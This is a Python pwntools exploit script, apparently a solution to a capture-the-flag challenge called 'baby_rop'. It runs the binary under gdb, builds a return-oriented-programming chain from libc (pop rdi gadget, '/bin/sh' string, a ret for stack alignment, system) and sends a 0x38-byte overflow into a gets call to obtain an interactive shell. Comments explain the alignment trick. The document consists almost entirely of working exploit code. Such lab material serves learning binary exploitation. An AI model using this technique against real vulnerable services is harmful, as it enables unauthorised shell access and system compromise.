from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]

p = gdb.debug("./baby_rop", '''
b *(main + 115)
continue
''')

e = ELF("./libc.so.6", checksec=False)
p.recvuntil(b"? ")
p.recv()

r = ROP(e)
bin_sh = next(e.search(b"/bin/sh"))
system = e.symbols.system

chain = [
    r.rdi.address, # pop rdi gadget
    bin_sh, # pop into rdi
    # at this point our ROP chain is an even number of quadwords. The next
    # `system` address will make it odd, meaning `sp` will not be 16-byte
    # aligned. A trick for keeping the stack aligned is adding a `ret`
    # instruction, which is essentially a no-op that advances the `sp` by 8
    r.ret.address, # align stack
    system # pop address of system into pc
]

# send '\n' for gets
p.sendline(b'A' * 0x38 + b"".join([p64(e) for e in chain]))
p.interactive()